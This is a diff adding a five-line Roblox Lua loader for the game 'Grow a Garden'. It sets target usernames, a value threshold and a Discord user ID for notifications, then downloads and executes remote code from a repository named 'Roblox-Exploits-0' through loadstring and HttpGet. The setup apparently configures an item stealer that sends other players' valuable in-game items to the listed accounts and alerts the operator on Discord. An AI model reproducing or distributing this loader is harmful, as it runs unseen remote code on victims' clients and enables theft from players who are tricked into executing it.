@@ -1,0 +1,5 @@
+_G.Usernames = {"jeffopIays_yt", "indiangaming_Pawan", "nxrf1axz"} -- you can add as many as you'd like
+_G.min_value = 100000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1272117382445269072" -- change to your Discord user ID
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-Exploits-0/Grow-A-Garden/refs/heads/main/test"))()
